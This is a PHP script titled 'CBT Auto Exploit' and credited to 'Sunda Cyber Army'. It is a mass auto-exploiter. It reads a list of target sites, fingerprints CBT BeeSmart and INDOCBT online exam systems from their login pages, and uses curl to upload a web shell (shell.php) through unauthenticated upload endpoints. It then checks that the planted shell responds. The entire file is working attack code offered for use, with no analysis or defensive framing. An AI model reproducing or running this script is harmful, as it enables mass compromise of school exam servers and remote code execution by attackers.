<?php

class Xploit{
 private function oke($url){	
    $cih = curl_init();
    $opt =
    [
      CURLOPT_URL            => $url,
      CURLOPT_SSL_VERIFYHOST => false,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_RETURNTRANSFER => true
    ];
    curl_setopt_array($cih, $opt);
    $sex = curl_exec($cih);
    $shek = curl_getinfo($cih, CURLINFO_HTTP_CODE);
    curl_close($cih);
    return (object)
      [
        "info" => $shek,
        "exe"  => $sex
      ];
        }	
 public function ok($url){	
    $cih = curl_init();
    $opt =
    [
      CURLOPT_URL            => $url,
      CURLOPT_SSL_VERIFYHOST => false,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_RETURNTRANSFER => true
    ];
    curl_setopt_array($cih, $opt);
    $sex = curl_exec($cih);
    $shek = curl_getinfo($cih, CURLINFO_HTTP_CODE);
    curl_close($cih);
    return (object)
      [
        "info" => $shek,
        "exe"  => $sex
      ];
        }	
 public function cbt($a){
    $green = "\033[0;32m";
    $red = "\033[0;31m";
    $blue = "\033[0;34m";
    $yel = "\033[0;33m";
    $white = "\033[1;37m";

    $cc = $a."/panel/pages/upload-logo.php";
    
    if($this->oke($cc)->info == 200){
          @shell_exec("curl --silent --connect-timeout 5 -X POST -F 'uploadfile5=@shell.php' $cc");
          $shex = $a."/images/shell.php";
          if(preg_match("/shell/", $this->oke($shex)->exe) AND $this->oke($shex)->info == 200) {
               print "     {$green}Sukses => $shex{$white}\n";
          } else {
               print "     Failed Upload Shell => $a \n";}
} else{
   print "     Failed To Exploit => $a\n";
}}
 public function mia(){
       print $green."          CBT Auto Exploit
          root@star | Sunda Cyber Army $white\n\n";

}
  public function indocbt($a){
    $green = "\033[0;32m";
    $red = "\033[0;31m";
    $blue = "\033[0;34m";
    $yel = "\033[0;33m";
    $white = "\033[1;37m";

    $cc = $a."/admin/action/slide1.php";
    
    if($this->oke($cc)->info == 200){
          @shell_exec("curl --silent --connect-timeout 5 -X POST -F 'uploadfile5=@shell.php' $cc");
          $shex = $a."/admin/images/shell.php";
          if(preg_match("/shell/", $this->oke($shex)->exe) AND $this->oke($shex)->info == 200) {
               print "     {$green}Sukses => $shex{$white}\n";
          } else {
               print "     Failed Upload Shell => $a \n";}
} else{
   print "     Failed To Exploit => $a\n";
}}
}

$web = $argv[1];
$star = new Xploit();
system("clear");
$star->mia();
if(!$web) exit("[!] Usage php {$argv[0]} list.txt\n");
if(!file_exists($web)) exit("[!] File {$argv[1]} not found\n");
$get = file_get_contents($web);
$exp = explode("\n", $get);


foreach($exp as $mek) {
   $cb = $mek."/login.php";
   $che =  $star->ok($cb)->exe;
   
   if(preg_match("/Ujian/", $che) AND $star->ok($cb)->info == 200){
         print "{$yel}[*] CBT BeeSmart{$white}\n";    
         $star->cbt($mek);
      }else{
                 if(preg_match("/INDOCBT/", $che) AND $star->ok($cb)->info == 200){
 
           print "{$yel}[*] INDOCBT{$white}\n";
           $star->indocbt($mek);
       }else{
           echo "{$yel}[?] What is type?\n";
           echo "     {$red}link => $mek\n";
 } 
}
  
}

?>
